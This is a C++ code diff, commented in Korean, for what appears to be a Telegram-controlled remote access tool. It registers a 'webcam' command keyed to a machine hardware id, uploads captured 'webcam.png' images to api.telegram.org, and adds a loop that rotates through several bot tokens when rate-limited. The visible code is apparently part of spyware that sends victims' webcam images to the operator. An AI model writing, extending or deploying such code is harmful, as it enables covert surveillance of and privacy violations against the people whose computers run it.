@@ -31,6 +31,8 @@ static bool SendTextWithButtons_Multi(long long chatId,
     const std::vector<std::string>& labels,
     const std::vector<std::string>& callbacks,
     int columns = 3) {
+
+    // --- markup 및 body 생성 로직 (이 부분은 변경 없습니다) ---
     std::string markup = "{\"inline_keyboard\":[";
     const int n = (int)labels.size();
     for (int i = 0; i < n; ) {
@@ -48,7 +50,10 @@ static bool SendTextWithButtons_Multi(long long chatId,
     std::string body = "chat_id=" + std::to_string(chatId) +
         "&text=" + UrlEncode(WToUtf8(textW)) +
         "&reply_markup=" + UrlEncode(markup);
-    std::wstring path = L"/bot" + BOT_TOKEN + L"/sendMessage";
+
+    // <<< CHANGED: BOT_TOKEN 부분을 제거하는 것이 핵심입니다.
+    std::wstring path = L"/sendMessage";
+
     std::string resp; bool ok = HttpPostForm(path, body, resp);
     return ok && resp.find("\"ok\":true") != std::string::npos;
 }
@@ -60,6 +65,7 @@ static bool SendPhotoFromBytes(long long chatId, const std::vector<unsigned char
     const std::string sep = "--" + boundary + "\r\n";
     const std::string end = "--" + boundary + "--\r\n";
 
+    // --- Body 생성 (filename이 "webcam.png"인 점 외에는 이전과 동일) ---
     std::string head1 = sep +
         "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
         std::to_string(chatId) + "\r\n" +
@@ -74,38 +80,80 @@ static bool SendPhotoFromBytes(long long chatId, const std::vector<unsigned char
     body.insert(body.end(), (const char*)png.data(), (const char*)png.data() + png.size());
     body.insert(body.end(), tail.begin(), tail.end());
 
-    HINTERNET S = WinHttpOpen(L"CppBot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!S) return false;
-    HINTERNET C = WinHttpConnect(S, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
-    if (!C) { WinHttpCloseHandle(S); return false; }
-    std::wstring path = L"/bot" + BOT_TOKEN + L"/sendPhoto";
-    HINTERNET R = WinHttpOpenRequest(C, L"POST", path.c_str(), nullptr, WINHTTP_NO_REFERER,
-        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    if (!R) { WinHttpCloseHandle(C); WinHttpCloseHandle(S); return false; }
+    // --- WinHTTP 전송 로직 (핵심 수정 부분) ---
+    HINTERNET hSession = nullptr, hConnect = nullptr, hRequest = nullptr;
+    BOOL bResult = FALSE;
+    bool finalSuccess = false;
 
-    std::wstring hdr = L"Content-Type: multipart/form-data; boundary=" +
-        std::wstring(boundary.begin(), boundary.end()) + L"\r\n";
-    BOOL ok = WinHttpSendRequest(R, hdr.c_str(), (DWORD)-1,
-        (LPVOID)body.data(), (DWORD)body.size(),
-        (DWORD)body.size(), 0);
-    if (ok) ok = WinHttpReceiveResponse(R, nullptr);
+    // <<< ADDED: 모든 토큰을 순회하며 재시도하기 위한 루프
+    const size_t max_retries = GetBotTokenCount();
+    if (max_retries == 0) return false;
 
-    bool ret = false;
-    if (ok) {
+    for (size_t attempt = 0; attempt < max_retries; ++attempt) {
+
+        // 이전 루프에서 사용한 핸들 정리
+        if (hRequest) WinHttpCloseHandle(hRequest);
+        if (hConnect) WinHttpCloseHandle(hConnect);
+        if (hSession) WinHttpCloseHandle(hSession);
+
+        hSession = WinHttpOpen(L"CppBot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+        if (!hSession) continue;
+
+        hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
+        if (!hConnect) continue;
+
+        // <<< CHANGED: GetCurrentBotToken()을 사용하여 현재 활성 토큰으로 fullPath 구성
+        std::wstring path = L"/bot" + GetCurrentBotToken() + L"/sendPhoto";
+
+        hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+        if (!hRequest) continue;
+
+        std::wstring hdr = L"Content-Type: multipart/form-data; boundary=" +
+            std::wstring(boundary.begin(), boundary.end());
+
+        bResult = WinHttpSendRequest(hRequest, hdr.c_str(), (DWORD)hdr.length(), (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
+        if (!bResult) continue;
+
+        bResult = WinHttpReceiveResponse(hRequest, NULL);
+        if (!bResult) continue;
+
+        // <<< ADDED: HTTP 상태 코드 확인 로직
+        DWORD dwStatusCode = 0;
+        DWORD dwSize = sizeof(dwStatusCode);
+        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwSize, NULL);
+
+        // 429 에러(Too Many Requests)인 경우, 다음 토큰으로 교체하고 재시도
+        if (dwStatusCode == 429) {
+            RotateToNextBotToken();
+            if (attempt < max_retries - 1) {
+                continue; // 마지막 시도가 아니면 다음 루프로
+            }
+        }
+
+        // 성공했거나, 429가 아닌 다른 에러인 경우, 응답을 읽고 루프를 중단
         std::string resp;
-        DWORD rd = 0;
-        do {
-            DWORD sz = 0;
-            if (!WinHttpQueryDataAvailable(R, &sz) || sz == 0) break;
-            std::vector<char> buf(sz + 1, 0);
-            if (!WinHttpReadData(R, buf.data(), sz, &rd)) break;
-            resp.append(buf.data(), rd);
-        } while (rd > 0);
-        ret = resp.find("\"ok\":true") != std::string::npos;
+        DWORD dwBytesAvailable = 0;
+        while (WinHttpQueryDataAvailable(hRequest, &dwBytesAvailable) && dwBytesAvailable > 0) {
+            std::vector<char> buffer(dwBytesAvailable);
+            DWORD dwRead = 0;
+            WinHttpReadData(hRequest, buffer.data(), dwBytesAvailable, &dwRead);
+            if (dwRead > 0) {
+                resp.append(buffer.data(), dwRead);
+            }
+        }
+
+        if (dwStatusCode == 200 && resp.find("\"ok\":true") != std::string::npos) {
+            finalSuccess = true;
+        }
+
+        break; // 성공이든 다른 에러든, 일단 루프 종료
     }
-    WinHttpCloseHandle(R); WinHttpCloseHandle(C); WinHttpCloseHandle(S);
-    return ret;
+
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+
+    return finalSuccess;
 }
 
 // ──────────────────────────────────────────────────────────────
@@ -495,3 +543,56 @@ static bool WebcamHandler(long long chatId, const std::string& hwid8, const std:
 struct WebcamRegistrar {
     WebcamRegistrar() { RegisterCommand("webcam", &WebcamHandler); }
 } g_webcam_registrar;
+
+static std::string WToUtf8(const std::wstring& w) {
+    if (w.empty()) return {};
+    int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
+    if (len <= 0) return {};
+    std::string out(len, 0);
+    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &out[0], len, nullptr, nullptr);
+    if (!out.empty() && out.back() == '\0') out.pop_back();
+    return out;
+}
+
+static std::string UrlEncode(const std::string& s) {
+    static const char hex[] = "0123456789ABCDEF";
+    std::string o;
+    o.reserve(s.size() * 3);
+    for (unsigned char c : s) {
+        if (('a' <= c && c <= 'z') || ('A' <= c && c <= 'Z') || ('0' <= c && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
+            o.push_back((char)c);
+        }
+        else {
+            o.push_back('%');
+            o.push_back(hex[c >> 4]);
+            o.push_back(hex[c & 15]);
+        }
+    }
+    return o;
+}
+
+static std::string JsonEscape(const std::string& s) {
+    std::string o;
+    o.reserve(s.size());
+    for (char c : s) {
+        switch (c) {
+        case '\"': o += "\\\""; break;
+        case '\\': o += "\\\\"; break;
+        case '\b': o += "\\b"; break;
+        case '\f': o += "\\f"; break;
+        case '\n': o += "\\n"; break;
+        case '\r': o += "\\r"; break;
+        case '\t': o += "\\t"; break;
+        default:
+            if ('\x00' <= c && c <= '\x1f') {
+                char buf[8];
+                sprintf_s(buf, "\\u%04x", (int)c);
+                o += buf;
+            }
+            else {
+                o.push_back(c);
+            }
+        }
+    }
+    return o;
+}
